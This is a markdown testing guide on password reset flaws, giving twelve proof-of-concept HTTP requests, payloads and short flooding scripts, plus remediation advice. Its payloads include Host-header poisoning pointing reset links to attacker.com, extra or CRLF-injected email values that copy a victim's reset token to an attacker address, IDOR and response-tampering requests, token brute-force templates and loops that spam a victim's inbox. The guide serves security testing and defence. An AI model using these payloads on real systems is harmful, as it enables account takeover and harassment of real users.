# Password Reset Vulnerabilities

## Description
Password reset vulnerabilities occur when the password recovery mechanism is poorly implemented, allowing attackers to take over user accounts. These vulnerabilities are critical as they directly lead to account compromise without requiring the original password.

## Common Vulnerabilities in Password Reset Flow

### 1. **Token Prediction/Weak Token Generation**
Reset tokens that are predictable or use weak randomness can be guessed or brute-forced.

### 2. **Token Not Invalidated**
Reset tokens that remain valid after use or after password change allow replay attacks.

### 3. **No Rate Limiting**
Lack of rate limiting allows attackers to brute-force reset tokens or flood users with reset emails.

### 4. **Token Leakage**
Tokens exposed in referrer headers, logs, or through other channels.

### 5. **Host Header Injection**
Manipulating the Host header to receive password reset links with attacker-controlled domains.

### 6. **Parameter Pollution**
Adding multiple email parameters to receive reset tokens for victim accounts.

### 7. **Token Reuse**
Tokens that don't expire or can be reused multiple times.

### 8. **IDOR in Reset Flow**
Manipulating user IDs or identifiers to reset other users' passwords.

### 9. **Password Reset Poisoning**
Injecting malicious URLs in password reset emails through header manipulation.

### 10. **No Email Verification**
System accepts password reset for any email without verification.

## Common Attack Vectors
- Password reset forms
- Reset token generation endpoints
- Password change endpoints
- Reset link handling
- Email verification bypass
- Token validation endpoints

## Testing Methodology & PoC Examples

### PoC 1: Host Header Injection for Password Reset Poisoning

**Vulnerability:** Application uses Host header to generate password reset links.

**Steps to Test:**
1. Intercept password reset request
2. Manipulate the Host header
3. Check if reset link contains attacker's domain

**Request:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

email=victim@example.com
```

**Expected Result:** Victim receives email with reset link pointing to `http://attacker.com/reset?token=...`

**Alternate Headers to Test:**
```http
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
```

---

### PoC 2: Password Reset Token Brute Force

**Vulnerability:** Weak or predictable reset tokens with no rate limiting.

**Steps to Test:**
1. Request password reset for your test account
2. Analyze the token format (numeric? alphanumeric? length?)
3. Use automated tools to brute force tokens
4. Check if rate limiting is enforced

**Example Token Patterns to Test:**
- 4-6 digit numeric codes: `0000` to `999999`
- Short alphanumeric: `a1b2c3`
- Predictable UUIDs or timestamps
- Sequential tokens

**Burp Suite Intruder Payload:**
```http
POST /reset-password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=test@example.com&token=§000000§
```

---

### PoC 3: Parameter Pollution to Hijack Reset Token

**Vulnerability:** Application sends reset token to both victim and attacker when multiple email parameters are provided.

**Steps to Test:**
1. Intercept password reset request
2. Add additional email parameter with attacker's email
3. Check if both emails receive reset tokens

**Request:**
```http
POST /forgot-password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com&email=attacker@example.com
```

**Alternative Formats:**
```http
email=victim@example.com,attacker@example.com
email[]=victim@example.com&email[]=attacker@example.com
email=victim@example.com%20attacker@example.com
email=victim@example.com%0Acc:attacker@example.com
```

---

### PoC 4: Token Not Invalidated After Use

**Vulnerability:** Reset tokens remain valid after password has been changed.

**Steps to Test:**
1. Request password reset for your test account
2. Receive reset token via email
3. Use token to reset password
4. Try using the same token again
5. Token should be rejected but if it works, vulnerability exists

**Request:**
```http
POST /reset-password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

token=abc123xyz&new_password=NewPassword123&confirm_password=NewPassword123
```

---

### PoC 5: IDOR in Password Reset

**Vulnerability:** User ID or identifier can be manipulated to reset other users' passwords.

**Steps to Test:**
1. Request password reset for your account
2. Intercept the reset confirmation request
3. Change user_id or identifier to another user
4. Complete password reset

**Request:**
```http
POST /reset-password HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "user_id": "1234",
  "token": "valid_token",
  "new_password": "NewPassword123"
}
```

**Change to:**
```json
{
  "user_id": "5678",
  "token": "valid_token",
  "new_password": "NewPassword123"
}
```

---

### PoC 6: No Rate Limiting on Reset Requests

**Vulnerability:** Application allows unlimited password reset requests.

**Steps to Test:**
1. Send 100+ password reset requests for the same email
2. Check if all requests are processed
3. Check victim's email inbox for spam

**Automated Test:**
```bash
for i in {1..100}; do
  curl -X POST https://example.com/forgot-password \
    -d "email=victim@example.com"
done
```

**Impact:** Email flooding, denial of service, token brute force enablement

---

### PoC 7: Token Exposed in Referer Header

**Vulnerability:** Reset token in URL is leaked via Referer header.

**Steps to Test:**
1. Receive password reset email with token in URL
2. Click the reset link
3. On the reset page, click any external link
4. Check if Referer header contains the reset token

**Example:**
```
Reset URL: https://example.com/reset?token=abc123xyz
User clicks external link to: https://attacker.com/page
Referer: https://example.com/reset?token=abc123xyz
```

**Fix:** Use POST method or store token in session, not URL

---

### PoC 8: Response Manipulation to Bypass Verification

**Vulnerability:** Client-side validation or response manipulation allows password reset.

**Steps to Test:**
1. Request password reset with invalid token
2. Intercept server response
3. Change error response to success response
4. Check if password is actually reset

**Original Response:**
```json
{
  "status": "error",
  "message": "Invalid token",
  "valid": false
}
```

**Modified Response:**
```json
{
  "status": "success",
  "message": "Token valid",
  "valid": true
}
```

---

### PoC 9: Token in Password Reset Link Never Expires

**Vulnerability:** Reset tokens have no expiration time.

**Steps to Test:**
1. Request password reset
2. Save the reset link
3. Wait 24-48 hours (or longer)
4. Try using the old reset link
5. If it works, tokens don't expire

**Best Practice:** Tokens should expire in 15-30 minutes

---

### PoC 10: Password Reset via Username Instead of Email

**Vulnerability:** System allows password reset using username enumeration.

**Steps to Test:**
1. Try resetting password using username instead of email
2. Observe different responses for valid vs invalid usernames
3. Enumerate valid usernames

**Request:**
```http
POST /forgot-password HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin
```

**Response Analysis:**
- Valid user: "Reset link sent"
- Invalid user: "User not found"

---

### PoC 11: Weak Cryptographic Token Generation

**Vulnerability:** Predictable tokens due to weak randomness.

**Steps to Test:**
1. Request multiple password reset tokens
2. Analyze patterns in tokens
3. Check if tokens are based on:
   - Current timestamp
   - User ID
   - Sequential numbers
   - Weak hash functions (MD5 of predictable data)

**Example Weak Token:**
```
Token: md5(user_id + timestamp)
If user_id=1000 and you know approximate time, token is predictable
```

---

### PoC 12: Authentication Bypass via Password Reset

**Vulnerability:** Password reset endpoint doesn't require current password.

**Steps to Test:**
1. While logged in to your account
2. Request password reset
3. Complete reset without providing current password
4. Check if 2FA or additional verification is bypassed

---

## Tools for Testing

### Burp Suite
- Intruder for token brute forcing
- Repeater for parameter manipulation
- Scanner for automated detection

### Custom Scripts
```python
import requests

# Test for rate limiting
for i in range(100):
    response = requests.post(
        'https://example.com/forgot-password',
        data={'email': 'victim@example.com'}
    )
    print(f"Request {i}: {response.status_code}")
```

### Token Analysis
```python
# Analyze token entropy and patterns
tokens = [
    'abc123',
    'abc124',
    'abc125'
]

# Check for sequential patterns, low entropy, predictability
```

## Exploitation Impact

- **High:** Direct account takeover
- **Critical:** If admin accounts can be compromised
- **Data Breach:** Access to sensitive user data
- **Reputation Damage:** Loss of user trust

## Remediation

1. **Use Cryptographically Secure Random Tokens**
   - Minimum 32 characters
   - Use `crypto.randomBytes()` or equivalent

2. **Implement Token Expiration**
   - 15-30 minutes validity
   - One-time use only

3. **Rate Limiting**
   - Limit reset requests per email/IP
   - Implement CAPTCHA after multiple attempts

4. **Invalidate Old Tokens**
   - After password change
   - After successful use
   - After expiration time

5. **Use POST Method**
   - Never put tokens in URL/GET parameters
   - Prevent Referer leakage

6. **Validate Host Header**
   - Whitelist allowed domains
   - Don't use Host header in email generation

7. **Implement Proper Email Verification**
   - Confirm email ownership
   - Send notifications for reset attempts

8. **Multi-Factor Authentication**
   - Require additional verification
   - SMS/App-based OTP

9. **Account Lockout**
   - Temporary lock after multiple failed attempts
   - Notify user of suspicious activity

10. **Security Logging**
    - Log all reset attempts
    - Monitor for abuse patterns
    - Alert on suspicious behavior

## References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)

## Payloads

See `password-reset-payloads.txt` for a comprehensive list of password reset attack payloads.
